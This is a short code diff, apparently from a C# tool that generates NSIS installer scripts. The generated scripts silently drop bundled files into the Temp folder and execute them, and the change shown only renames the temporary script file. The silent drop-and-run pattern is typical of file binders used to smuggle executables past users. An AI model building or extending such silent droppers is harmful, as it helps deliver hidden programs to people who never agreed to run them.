@@ -63,11 +63,11 @@ namespace GUI
                     _Files += $"Section \"{"file" + i}\"\r\nSetOutPath \"${"Temp"}\"\r\nSetOverwrite on\r\nFile \"{_New_Path}\"\r\nExec ${"Temp"}\\{_New_Path.Remove(0x0, _New_Path.LastIndexOf('\\') + 0x1)}\r\nSectionEnd\r\n\r\n";
                 }
 
-                File.AppendAllText("source.txt", "OutFile \"out.exe\"\r\nSilentInstall silent\r\nRequestExecutionLevel user\r\n" + _Files);
+                File.AppendAllText("Settings.txt", "OutFile \"out.exe\"\r\nSilentInstall silent\r\nRequestExecutionLevel user\r\n" + _Files);
                 Make();
                 File.Copy(Application.StartupPath + "\\out.exe", _Save_File_Dialog.FileName);
                 Directory.Delete(_Startup_Path, true);
-                File.Delete("source.txt");
+                File.Delete("Settings.txt");
                 File.Delete("out.exe");
                 MessageBox.Show("Done");
             }
@@ -82,7 +82,7 @@ namespace GUI
                 _Process.StartInfo.FileName = Application.StartupPath + "\\NSIS\\makensis.exe";
                 _Process.StartInfo.UseShellExecute = false;
                 _Process.StartInfo.RedirectStandardOutput = true;
-                _Process.StartInfo.Arguments = "source.txt";
+                _Process.StartInfo.Arguments = "Settings.txt";
                 _Process.Start();
                 _Process.BeginOutputReadLine();
                 _Process.WaitForExit();
